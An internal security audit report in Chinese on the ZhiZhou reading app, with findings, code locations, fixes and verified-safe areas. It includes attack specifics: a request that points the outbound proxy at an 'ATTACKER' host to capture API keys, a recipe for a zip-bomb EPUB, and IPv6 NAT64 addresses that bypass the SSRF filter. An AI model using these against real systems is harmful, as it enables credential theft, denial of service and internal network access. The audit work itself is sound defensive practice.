**纸舟安全审查 · 2026-11-25**

本轮只做**安全向**审查，与 [2026-11-08 深度审查](./2026-11-08-deep-review.md)（可靠性/成本导向）互补。审查基线为 `main` 的 `b6bb1f5f`，工作区干净。

**方法**：4 组并行静态审计（鉴权与越权 / 注入与外联 / Web 与 iOS 客户端 / AI 子系统与计费）+ 主审复核。所有结论都落到源码行；标注「已复核」的条目由主审逐行确认，标注「子审计证据」的条目由专项审计给出代码与实测证据、主审未独立复现。审查阶段**未修改任何业务代码、未连接生产库、未发起对外攻击**。

**结论**：没有找到「未授权用户即可直接打穿」的高危漏洞；参数化 SQL、SSRF 基线、备份归档加密、邮件 Webhook 验签、CSP/CSRF/Cookie 等基础面明显是经过设计的。真正需要立刻处理的是 **1 项管理员垂直越权（H1）**，以及 **4 项中等风险**（管理员可达的内存耗尽、跨管理员任务控制、超管密钥被管理员借用、CSP 全程 Report-Only）。H1 / M1 / M5 已在本报告同批工作区改动中修好，见文末「已修复」。

---

## 问题总表

| 编号 | 级别 | 问题 | 可触达主体 | 证据级别 |
| --- | --- | --- | --- | --- |
| H1 | 高 | `save-proxy-config` 未纳入超管判定，普通管理员可改全站出站代理并截获密钥 | `role=admin` | 已复核（代码 + 既有超管边界测试） |
| M1 | 中 | EPUB 导入无过滤解压，518 字节文件可分配 2 GiB；`/preview` 无请求体上限 | `role=admin` | 已复核 + 子审计实测 |
| M2 | 中 | AI 任务的取消/删除/重试/产物无归属校验，可跨管理员操作 | `role=admin` | 已复核 |
| M3 | 中 | `providerPresetId` 只做 `requireAdmin`，管理员可借用超管预设的 baseUrl/apiKey | `role=admin` + 已知 UUID | 已复核 |
| M4 | 中 | CSP 全程 `Report-Only` 且无 `report-uri`；Turnstile 脚本无 SRI | 任意 XSS 面 | 已复核 + 子审计证据 |
| M5 | 低-中 | 无全局请求体上限，匿名 `POST /api/thoughts` 可直接吃内存 | 匿名 | 已复核 |
| M6 | 低-中 | 读者日额度预留在上游失败时不释放，失败也占一整天额度 | `reader` | 已复核 |
| L1 | 低 | `isPrivateIp` 未覆盖 IPv6 过渡段（NAT64/6to4/Teredo），重定向可绕过内网拦截 | 管理员发起抓取 | 子审计实测（本机复现） |
| L2 | 低 | `contentMode=safe` 在 comments/thoughts/ratings/小说详情未生效，安全模式可被绕过 | 已开成人模式的账号 | 子审计证据 |
| L3 | 低 | 幂等键在「业务已提交、回执写失败」时被删除，重试会重复执行（2026-11-08 的 F6 仍未修） | 前端重试 | 已复核 |
| L4 | 低 | `POST /api/site/visits` 匿名、无限流写库 | 匿名 | 已复核 |
| L5 | 低 | 安装窗口（无管理员时）`/api/setup/options` 未鉴权可写 `PROXY_BASE`/`CORS_ORIGINS`/AI 密钥 | 首个访问者 | 已复核（设计权衡，见正文） |
| L6 | 低 | iOS 无 SSL Pinning；Keychain 未指定 `kSecAttrAccessible` | 设备取证/企业证书 | 子审计证据 |
| L7 | 低 | `GET /api/ai/settings` 向普通管理员回显上游 baseUrl（常为内网地址） | `role=admin` | 已复核 |
| L8 | 低 | `reauthenticated_at` 被写入但无任何授权判断消费 | — | 子审计证据 |
| L9 | 低 | 内容分级规则候选搜索的 LIKE 未转义反斜杠，含 `\` 的查询 500 | `role=admin` | 子审计证据 |
| L10 | 低 | 远端图片下载先整包 `arrayBuffer()` 再判大小 | 管理员/上游被控 | 子审计证据 |
| L11 | 低 | 上游错误文本（≤500 字符）原样回显到管理端与 `ai_tasks.error` | 上游网关 | 子审计证据 |

---

## H1 · [高] 普通管理员可改写全站出站代理

**位置**：[`api/src/routes/scrape.ts:611-616`](../../api/src/routes/scrape.ts#L611-L616)（`case 'save-proxy-config'`）、[`shared/roles.ts:29`](../../shared/roles.ts#L29)（`/^(proxy|source-account|save-proxy-config)(?:-|$)/`）、[`api/src/middlewares/auth.ts:54-57`](../../api/src/middlewares/auth.ts#L54-L57)。

**为什么是漏洞**：`/api/scrape` 整组只有 `requireAdmin()`，超管边界完全靠 `requiresSuperAdministrator` 的动作名前缀正则。原正则匹配 `proxy`、`proxy-config`、`proxy-test`、`proxy-logs`，**不匹配 `save-proxy-config`**；处理分支里也没有像 `source-account-*`（`scrape.ts:247`）那样显式补一句 `role !== 'super_admin' → 403`。结果读配置要超管、写配置只要是管理员：

```
POST /api/scrape  {"action":"save-proxy-config","proxyBase":"http://ATTACKER:8080","proxyBypass":""}
→ 200 {"ok":true,...}          # 普通 admin 即可
GET  /api/scrape?action=proxy-config
→ 403 {"error":"需要超级管理员权限"}
```

仓库里既有的边界测试（`api/src/routes/account-security.test.ts:128-144`）证明这是**设计上的**超管能力，只是恰好只覆盖了 `proxy` / `proxy-config` 两个名字；`scrape.test.ts:278-311` 的成功用例走的是 bootstrap 出来的 `super_admin` 令牌，所以普通管理员路径一直没被断言。

**影响链（已核对调用点）**：`save-proxy-config` 通过 `writeRuntimeConfig` + `syncRuntimeConfigToEnv` 立即生效并落盘（`api/src/runtime-config.ts`，`PROXY_BASE/PROXY_BYPASS` 在白名单内）。之后：

- [`api/src/services/outbound-fetch.ts:112-125`](../../api/src/services/outbound-fetch.ts#L112-L125) 在没有环境级 `HTTP(S)_PROXY` 时用运行时 `PROXY_BASE` 作转发代理；
- [`api/src/services/ai/client.ts`](../../api/src/services/ai/client.ts) 的模型请求带 `Authorization: Bearer <apiKey>` 经同一出口 → **可抓到超管才能配置的模型密钥**；
- 书源抓取、书源账号会话（加密 Cookie）、封面下载全部走同一代理 → 可被动读、可伪造正文、可把出站打到内网。

Bearer 客户端不受 CSRF 与 `accountChanged` 约束（`browser-security.ts:11`、`auth.ts:16-23`），脚本一条 curl 即可完成。

---

## M1 · [中] EPUB 导入无过滤解压，可把 API 进程打到 OOM

**位置**：[`api/src/services/book-import.ts:1239-1240`](../../api/src/services/book-import.ts#L1239-L1240)（原 `parseEpubImport` 第一行 `const entries = unzipSync(data)`，无 `filter`、无累计大小校验）、[`api/src/routes/book-import.ts:157`](../../api/src/routes/book-import.ts#L157)（`POST /api/book-import/preview`，multipart 分支，原无 `bodyLimit`，只有 25 MB 的事后检查）、`:44`（`requireAdmin()`，且 `shared/roles.ts` 的超管清单不含 `/api/book-import`）。

**根因**：`fflate` 的 `unzipSync` 用中央目录里的未压缩大小字段**先分配**缓冲区，该字段可任意伪造——声明 4 GiB 就分配 4 GiB，与真实压缩流无关。对比之下 ZIP 路径（`api/src/services/book-import-zip.ts:22-41`）有 400 条目 / 64 MB 的 `total += entry.originalSize` 限制，**只有直传 `.epub` 这个入口漏了**。

**子审计实测**（`node_modules/fflate/esm/index.mjs`，与 `parseEpubImport` 同样的无 filter 调用）：

```
样文件 518 字节（远低于 25MB 上限），4 个条目各声明 512 MiB
unzipSync 耗时 5ms → arrayBuffers 增长 2047 MiB
```

**触发**：普通 admin 会话 `POST /api/book-import/preview`，`-F file=@bomb.epub`，`bomb.epub` 只需把中央目录 `su` 字段改成 `0x7FFFFFF0`。

---

## M2 · [中] AI 任务的取消/删除/重试/产物缺少归属校验

**位置**：[`api/src/routes/ai.ts:1904-1917`](../../api/src/routes/ai.ts#L1904-L1917)（`/tasks/:id/generations`）、`:1919-1940`（`/tasks/:id/cancel`）、`:1946-1952`（`DELETE /tasks/:id`）、`:1955-1996`（`/tasks/:id/retry`）；底层 [`api/src/services/ai/tasks.ts:153-157`](../../api/src/services/ai/tasks.ts#L153-L157)、`:164-166`（纯 id 语义，无 `user_id` 谓词）。

**不一致点**：同组的 `GET /tasks/:id` 与 `GET /tasks/:id/stream`（`ai.ts:1892`、`:1899`）都写了 `task.kind === 'agent_chat' && task.userId !== user.id → 404`，四项写操作漏了同一判断。

**后果**：站点存在 ≥2 个管理员时，管理员 B 可以掐掉 A 正在跑的写作助手回合、删掉 A 的 `agent_chat` 记录（A 会话里的产物随后 404）、或以 A 存下的 `params` 在 B 名下重跑一次计费任务。

**修复**：`cancelAiTask` / `deleteAiTask` / `listTaskGenerations` 增加 `viewerUserId` 参数并加 `AND (kind <> 'agent_chat' OR user_id = $n)`；`retry` 复用 `GET /tasks/:id` 的 404 判定。

---

## M3 · [中] 普通管理员可借用超管专属模型预设的密钥

**位置**：[`api/src/routes/ai-agent.ts:205-226`](../../api/src/routes/ai-agent.ts#L205-L226)（`body.providerPresetId` → `getProviderPreset(id)` → `withProviderSnapshot({ baseUrl, apiKey, model })`）、`:237-252`（恢复路径同样接受）；`api/src/routes/ai-chapter-edit.ts:33-35,80`。整组 `/api/ai/agent` 只有 `requireAdmin()`（`ai-agent.ts:62`）。

**为什么算越权**：`requiresSuperAdministrator` 把 `/api/ai/provider`、`/api/ai/provider-presets`、`/api/ai/test` 划为超管专属，即「密钥的读、写、测」都只对超管开放；但「拿这套密钥去花钱」的通道只要求管理员。附带计费错位：用量记在调用者名下，实际消耗的是超管配置的额度。

**可利用性**：预设 id 是 `randomUUID()`，不可枚举，`GET /provider-presets` 为超管专属且会剥掉 `apiKey`，所以需要 id 从截图、前端缓存或协作沟通中泄漏——定级中。

**修复**：`providerPresetId` 仅在 `isSuperAdministrator()` 时受理，否则 403；或给预设加 `owner_user_id` 并校验归属。

---

## M4 · [中] CSP 全程 Report-Only，XSS 没有第二道防线

**位置**：[`api/src/middlewares/browser-security.ts:47-52`](../../api/src/middlewares/browser-security.ts#L47-L52)（`Content-Security-Policy-Report-Only`，仅 html 响应）、`scripts/export-browser-security-headers.mjs:16`（导出的 nginx 配置同样是 Report-Only）、`web/index.html`（无 meta 兜底）。

**影响**：策略里 `script-src` 的 sha256 白名单、`object-src 'none'`、`base-uri 'self'`、`frame-ancestors 'none'` 全部不阻断；且没有 `report-uri`/`report-to`，违规只落浏览器控制台。配合 `img-src https:` / `connect-src https:` 全域放开，一旦出现注入即可把数据外带到任意 https 域。当前 Web 侧自身的渲染面是干净的（见文末安全清单），所以这是**纵深防御缺口**而非已被利用的通道。

**修复**：切换为强制 `Content-Security-Policy`，补 `report-uri` 落库；`connect-src` 收窄到 `'self'` + 明确域名；`web/src/lib/turnstile.ts:12-13` 动态注入的 Cloudflare 脚本固定版本路径，并把未使用的 `static.cloudflareinsights.com` 从白名单删掉。

---

## M5 · [低-中] 缺少全局请求体上限

**位置**：`api/src/app.ts:51-74`（原无 `bodyLimit` 中间件）、`api/src/index.ts:108`（`serve({ fetch })`，Node http 层不限 body）；逐路由 `bodyLimit` 只覆盖了 auth / security / backups / reading-* / keepsakes / book-import 的 zip 分支 / site-settings。

**可利用入口**：`POST /api/thoughts`（`api/src/routes/thoughts.ts:145`，`optionalUser` → **匿名可调**）直接 `await c.req.json()`，无上限；`/api/comments`、`/api/bookshelf`、`/api/progress`、`/api/bookmarks`、`/api/chapters`（admin）同理。

---

## M6 · [低-中] 读者日额度在上游失败时不释放

**位置**：[`api/src/services/ai/usage.ts:121-136`](../../api/src/services/ai/usage.ts#L121-L136)（预留行 `expires_at = 次日零点`）、`:139-143`（`settleReaderQuota` 只在 `ai_usage` 已写入时才删行）；调用点 `api/src/services/ai/summary.ts:133-159`、`catchup.ts:168-193`、`story-echoes.ts:246-259` 都是「预留 → `chat()` → 记账 → 结算」，**没有 try/catch 释放**。

**后果**：上游 5xx / 超时 / 限流时 `chat()` 直接抛错，预留行留到当日 24:00，读者当天额度被永久吃掉 1 次；重试还会继续吃。注意 2026-11-08 的 F2（并发超发）已修好，这里剩下的只是**失败路径不返还**——如果这是有意的「不确定调用也算一次」，请在注释或产品文案里写明；否则在 `chat()` 失败且无 partial usage 时删除预留行。

---

## L1 · [低] `isPrivateIp` 漏判 IPv6 过渡地址段

[`api/src/services/safe-fetch.ts:50-59`](../../api/src/services/safe-fetch.ts#L50-L59) 的 IPv6 分支只处理 `::`、`::1`、`0000::/8`、`fc00::/7`、`fe80::/10`。子审计用导出的纯函数实测（全 IP 字面量，无 DNS/出站）：

```
BLOCKED 0x7f000001 / 2130706433 / 0177.0.0.1 / 127.1 / 127.0.0.1.:80 / [::1] / [::ffff:127.0.0.1] / 169.254.169.254
ALLOWED [64:ff9b::7f00:1] / [64:ff9b::a9fe:a9fe](NAT64 映射元数据) / 2002:7f00:1::(6to4) / 2001::(Teredo) / 100::/64
```

重定向的每一跳只做 URL 校验（`safe-fetch.ts:160-165`），一个被当作书源/封面源的站点 302 到 `http://[64:ff9b::a9fe:a9fe]/` 时，在启用 NAT64/DNS64 的宿主机上会真的连到链路本地元数据地址。是否连通取决于宿主网络，属环境依赖项。

**修复**：IPv6 改白名单式（只放行 `2000::/3`，并显式拒绝 `64:ff9b::/96`、`64:ff9b:1::/48`、`2002::/16`、`2001::/32`、`100::/64`）；根治手段是用自定义 `dispatcher` 把校验通过的 IP 钉住，顺带消掉 `safe-fetch.ts:9-11` 自述的 DNS rebinding 窗口。

---

## L2 · [低] `contentMode=safe` 覆盖不一致，安全模式可被绕过取到 R18 文本

服务端对 `?contentMode=safe` 的处理是分裂的：

- **生效**：`api/src/routes/chapters.ts:37,55,108`、`chapter-illustrations.ts:35-40`、`reading-keepsakes.ts:22-27`、`reading-data.ts:17-19`、`reading-stats.ts:42-43,77`、`bookmarks.ts:15,65-75`、`bookshelf.ts:18-20`、`progress.ts:131`、`novels.ts:148`（列表）。
- **不生效（只看账号模式）**：`comments.ts:30-43`、`thoughts.ts:71-74,115-118,129-132,203-206,329-332`、`ratings.ts:21-24,39-42,65-68`、`novels.ts:315-318`（**同一文件里列表尊重、详情不尊重**）。

即已开成人模式的账号想临时进安全模式时，`GET /api/chapters/<id>?contentMode=safe` 返回 403，但同一章的段评、评论、评分与小说详情仍返回 R18 文本。若产品定义「safe 只作用于列表筛选」，那 `chapters.ts:108` 的 403 就属于多余行为——两者必有其一不一致。建议在 `content-access.ts` 加统一的 `denyIfSafeMode(c, rating)`，逐路由替换。

---

## L3 · [低] 幂等键在回执写失败时被删除（F6 残留）

[`api/src/services/idempotency.ts:126-147`](../../api/src/services/idempotency.ts#L126-L147)：业务 `handler()` 成功后，用在**另一个事务**里把 pending 改成 `completed`；这一步一旦抛错就落进 `catch`，把 pending 行删掉。调用方重试时同一 `Idempotency-Key` 会重新执行业务，产生重复副作用。2026-11-08 的审查已把它记为 F6 并排入后续批次，本轮确认**仍未修**。修法：把业务提交与 `completed` 写入放进同一事务，或用「业务已提交」标记 + 重放空响应。

## L4 · [低] `POST /api/site/visits` 匿名无限制写库

[`api/src/routes/site.ts:43-55`](../../api/src/routes/site.ts#L43-L55)：格式校验通过即 `INSERT INTO site_visits`，无鉴权、无限流、无去重窗口。任何人对同一 `visitorId`/`path` 循环 POST 就能持续放大表体积并污染后台流量看板。建议按 IP + visitorHash 做分钟级去重（`ON CONFLICT` 或计数器），并在超限时静默 204。

## L5 · [低] 安装窗口未鉴权可写运行时配置

[`api/src/routes/setup.ts:168-190`](../../api/src/routes/setup.ts#L168-L190)：当数据库已配置、但 `users` 表里**尚无管理员**时，`POST /api/setup/options` 对任何访问者开放，可写入 `AI_TEXT_BASE_URL/AI_TEXT_API_KEY`、`PROXY_BASE/PROXY_BYPASS`、`CORS_ORIGINS`。这与注释里自述的「首个访问者创建管理员」同一信任模型，但暴露窗口更宽：新实例一旦在 bootstrap 前被公网扫到，攻击者可以把出站代理或模型端点指向自己，并在管理员创建后继续生效。建议 bootstrap 完成前只允许来自回环/私网地址的请求，或要求一次性安装令牌（`INSTALL_TOKEN`）。

## L6 · [低] iOS 传输与存储加固缺口

- 无 SSL Pinning：`ios/ZhiZhou/Networking/APIClient.swift:82-216` 只有 `#if DEBUG` 的调试放行分支，Release 完全依赖系统信任链 → 企业证书/MDM/取证代理可解密全部 Bearer 与登录口令。
- Keychain 未指定 `kSecAttrAccessible`：`ios/ZhiZhou/Networking/Keychain.swift:11-31` 使用默认 `WhenUnlocked`，会话 token 会随加密备份迁移到其他设备。建议 `kSecAttrAccessibleAfterFirstUnlockThisDeviceOnly` + 显式 `kSecAttrSynchronizable: false`。
- 章节正文/图片缓存未设文件保护等级（`ZhiZhouCore/.../ChapterDiskCache.swift:92-106`），与 `ReaderEdgeLocalStore.swift:34` 的写法不一致。

## L7 · [低] `GET /api/ai/settings` 向普通管理员回显上游 baseUrl

`api/src/routes/ai.ts:397-430` 只把 `apiKey` 收口成布尔，`baseUrl` 原样返回；而写口是超管专属（`shared/roles.ts:28`）。真实部署里该值常是内网地址，属基础设施拓扑信息。建议读口与写口对齐，或只回 host。

## L8 · [低] `reauthenticated_at` 无消费方

`api/src/services/reauthentication.ts` 与会话表写入了该时间戳，`POST /api/auth/reauthenticate`、`/api/auth/passkeys/reauth/*` 也在更新它，但全仓没有任何中间件读取它做门禁——敏感操作（改密、改角色、恢复备份、改站点设置）并不要求会话新鲜度。若产品预期是「passkey 二次验证后才允许敏感操作」，服务端这一半尚未实现。

## L9 · [低] LIKE 反斜杠未转义导致 500

`api/src/services/content-rating-rule-candidates.ts:282,289` 只转义 `%` 与 `_`，却声明了 `ESCAPE '\'`；搜索串含裸 `\` 时 PostgreSQL 直接报 "pattern must not end with escape character"。改用 `api/src/services/text.ts:37-39` 的 `escapeLike` 即可（其余站点已统一走它）。

## L10 · [低] 远端图片下载先整包读入

`api/src/services/covers.ts:38-41`（只信 `Content-Length`，然后无上限 `arrayBuffer()`）、`api/src/services/scraper/enrich.ts:44-48`、`api/src/services/ai/image.ts:176-186`（完全无上限，URL 来自 AI 网关响应）。建议统一用 `api/src/services/scraper/fetch.ts:13-45` 的流式限长模式。

## L11 · [低] 上游错误文本回显

`api/src/services/ai/client.ts:288,357,607-628` 把上游响应体截 500 字符拼进 `AiError.message`，再由 `api/src/routes/ai.ts:2426-2445` 下发到管理端与 `ai_tasks.error`。第三方网关可借此让任意文案出现在后台界面（社工面）；是否会带出密钥片段取决于上游错误体，未验证。建议对外只映射 `code`，原文只进服务端日志。

---

## 已修复（与报告同批的工作区改动，未提交）

| 编号 | 修复位置 | 内容 | 验证 |
| --- | --- | --- | --- |
| H1 | [`shared/roles.ts:29`](../../shared/roles.ts#L29)、[`api/src/routes/scrape.ts:611-616`](../../api/src/routes/scrape.ts#L611-L616) | 超管动作名单补 `save-proxy-config`；处理分支再加 `role !== 'super_admin' → 403` 双保险（即便以后有人改回正则也不会退化成可写） | `account-security.test.ts` 新增 manager 断言 403；`scrape.test.ts` 的超管保存/读回用例仍 200 |
| M1 | [`api/src/services/book-import.ts:1238-1266`](../../api/src/services/book-import.ts#L1238-L1266) | `parseEpubImport` 改用受限解压 `unzipEpubEntries`：在 `filter` 阶段（fflate 分配缓冲之前）按中央目录声明值累计限额 64 MB / 2000 项，并校验条目路径（绝对路径、盘符、`..`、控制字符） | `book-import-zip.test.ts` 新增「伪造 2 GiB 声明」用例：请求被拒、`arrayBuffers` 增量 < 128 MB；正常 EPUB 解析不受影响 |
| M1/M5 | [`api/src/middlewares/request-body-limit.ts`](../../api/src/middlewares/request-body-limit.ts)、[`api/src/app.ts:53`](../../api/src/app.ts#L53)、[`api/src/routes/book-import.ts:157`](../../api/src/routes/book-import.ts#L157)、[`api/src/routes/ai.ts:1140`](../../api/src/routes/ai.ts#L1140) | `/api/*` 全局请求体兜底 16 MB，上传类按最长前缀放宽（`preview-zip` 70 MB、`preview` 32 MB、`cover/upload` 8 MB）；`/preview`、`/cover/upload` 各自补 `bodyLimit`，在 `formData()` 之前生效 | 探针：匿名 20 MB JSON → 413；`/preview` 20 MB 仍放行；正常体放行。既有逐路由 `bodyLimit`（认证 16 KB、备份 64 KB、插图 10 MB 等）保持不变且更早生效 |

验证记录：`npm run typecheck --workspace=@zhi-zhou/api` 通过；ESLint 对全部改动文件通过；`account-security` / `scrape` / `book-import-zip` 三套共 44 例全绿。`ai.test.ts` 有 1 例 `promptTokens` 断言失败，已在 `HEAD` 基线（stash 后）复现同样失败，属既有问题、与本次改动无关。

---

## 已确认安全、不必重复排查

**注入与文件系统**

1. **SQL 全参数化**：`ORDER BY ${...}` 只有 `novels.ts:176-177,227,236`（`SORT_FIELDS`/`SORT_ORDERS` 白名单）、`bookshelf.ts:35-40`（Map 查表）、`comments.ts:68`、`agent-retrieval.ts:274-280`（三目常量）；`UPDATE ... SET ${fields}` 只迭代代码内 allowlist（`scraper/store.ts:265-273,356-372,482-498`）；`IN (${placeholders})` 与 `${where}` 均由 `params.push` + `$n` 构造。`escapeLike` 覆盖 12 处 LIKE/ILIKE（唯一例外是 L9）。
2. **命令执行面只有一处**：`api/src/services/backups/process.ts:35` 的 `spawn(..., { shell: false })`；工具路径要求绝对路径 + 禁控制字符 + `pg_dump (PostgreSQL)` 指纹；rclone 的 host/user/path 禁 `[\r\n\0]`、SFTP 必须绝对路径，`known_hosts` 用解析后的 IP 写入。
3. **路径穿越**：`backups/archive.ts:30-34` 的版本 id 正则、`backupRoot()` 拒绝静态目录、ZIP 条目校验 `..`/绝对路径/盘符/NFC 重名且不落盘、`@hono/node-server` 的 `serveStatic` 拒绝 `%`/`..`/`//`/`\`。
4. **无 XXE / 无模板注入 / 无反序列化**：依赖里没有 XML 解析器（EPUB 全靠正则）、全仓无 `eval`/`new Function`/`node:vm`/`innerHTML`/`document.write`；`c.html()` 的两处插值分别是白名单 action 与 `JSON.stringify(siteKey).replace(/</g,'\\u003c')`。
5. **sharp 图片炸弹**：`cover-display.ts:21`、`chapter-illustrations.ts:118`、`thoughts.ts:385` 均设 `limitInputPixels`。

**认证 / 会话 / 授权**

6. 会话 token 32 字节随机、只存 `sha256(salt+token)`（`services/auth.ts:113-124`）；`__Host-` Cookie + `HttpOnly` + `SameSite=Lax`（`browser-session.ts:34-45`）；PBKDF2-SHA256 12 万次 + 常量时间比较。
7. CSRF 双保险：全局 `X-ZZ-CSRF: 1` + Origin 白名单（`browser-security.ts:8-26`），浏览器非 GET 请求还要 `X-ZZ-Account`（`auth.ts:16-23`）；Bearer 客户端不依赖环境凭据，故不受影响。
8. CORS 只在同源或 `CORS_ORIGINS` 白名单回显 `Allow-Origin`（`middlewares/cors.ts:36-53`）。
9. 超管路径判定经 Hono 4.13.17 实测：大小写、尾斜杠、双斜杠、`%62`、`%2e%2e`、`%00`、`;` 都无法让「路由命中的 path」与「`requiresSuperAdministrator` 读到的 path」产生分歧（唯一缺口是 H1 的 action 名，已修）。
10. 读者数据面（`reading-data`/`reading-keepsakes`/`bookmarks`/`bookshelf`/`progress`/`reading-stats`/`passkeys`）全部按 `c.get('user').id` 收敛，跨账号 id 无法读写；`visibleNovelSql` 在每条内容读取 SQL 之前生效，`selected` 需 `novel_access_grants` 命中。
11. 禁用账号即时失效（`sessions.ts:28`、`content-access.ts:124-127`）；成人访问令牌 HMAC 绑定 `sessionHash` 且必须回查有效会话（`content-access.ts:34-49,114-141`）；账号模式变更被服务端拒于 `/api/auth/reader-settings` 之外，只能走 `/api/content-policy/unlock`（Turnstile + 限流）。
12. 邮件：SMTP `from` 禁 CRLF、`normalizeEmail` 正则阻断头注入；svix 原始 body 验签 + `svix-id` 主键去重 + `Object.hasOwn` 防原型链；邮件队列 payload AES-256-GCM 加密。
13. 备份归档：manifest HMAC-SHA256 + AES-256-GCM(AAD=id) + 恢复前复查摘要与 `keyId`，远端副本同样先验签再落盘。
14. 书源账号密码/Cookie 使用 AES-256-GCM 加密存库（`api/private-sources/source-account.ts`，密钥自动生成并 0600 落盘）。

**AI 子系统**

15. Agent 的工具全部被 `session.novelId`/`userId` 硬绑定；唯一写路径是「建确认卡 → 作者手动确认 → 服务端重放已保存 payload」（`agent-actions.ts:229-278`），注入无法造成越权写入；章节写回在事务内二次校验 `content` 与 revision。
16. 工具参数走服务端二次 schema 校验（`agent-tools.ts:21-23,152-197`），模糊查询统一 `escapeLike` + `ESCAPE '\'`。
17. 读者侧 AI 接口在生成前后各做一次可见性/分级校验；缓存优先于配额；in-flight 去重避免重复计费。

**客户端**

18. Web：章节 HTML 经白名单消毒（`web/src/lib/reader-utils.ts:146-169` 只保留 `P/BR/EM/STRONG/BLOCKQUOTE` 且不复制任何属性），4 个 `dangerouslySetInnerHTML` 落点全部经过它；Markdown 走 `react-markdown` 默认 `urlTransform`（`javascript:` 被剥离）+ `skipHtml`；会话真值在 HttpOnly Cookie，前端只存随机 marker；服务端 SEO 页全部 `escHtml`，品牌 JSON 用 `\u003c` 转义。
19. iOS：ATS 未放宽（`Info.plist` 无 `NSAllowsArbitraryLoads`/`NSExceptionDomains`）、token 只在 Keychain（不在 UserDefaults/文件）、无日志打印 token、无 URL 携带 token、WebView 导航白名单到 scheme/host/port/path 全等、无 `evaluateJavaScript`、无自定义 URL Scheme 深链、Passkey 的 RP ID 本地校验、原生网络层关闭 `httpCookieStorage`。

---

## 修复顺序建议

1. ~~**H1**~~ 已完成。
2. ~~**M1 / M5**~~ 已完成（受限解压 + 统一 `bodyLimit`）。
3. **M2 / M3** —— 给 AI 任务补归属谓词、给 `providerPresetId` 补超管判定。
4. **L3**（F6 幂等事务）——已跨一个版本，属于「会重复执行副作用」的正确性问题。
5. **M4**（CSP 转强制 + 补 report-uri）与 **L2**（`contentMode=safe` 统一）。
6. **L1 / L4 / L5 / L9 / L10**（小改动，可并入同批）。
7. **M6 / L7 / L8 / L11** 与 **L6**（iOS）按发版节奏处理。

## 审查边界

- 未运行完整测试套件（`GEMINI.md` 要求非必要不跑），未启动服务，未连接生产库；`TRUST_PROXY`、`CORS_ORIGINS`、`SESSION_HASH_SALT` 等在**部署侧**的实际取值未核验。
- `api/private-sources/`（已 gitignore）里的私有书源适配器只做了凭据存储与抓取调用方式抽查，未逐个审计。
- L1 的「能否真的连到元数据地址」、L6 类 iOS 跳转行为、L11 上游错误体是否含密钥片段，都需要真机/真实上游才能定论，本文按代码事实定级。
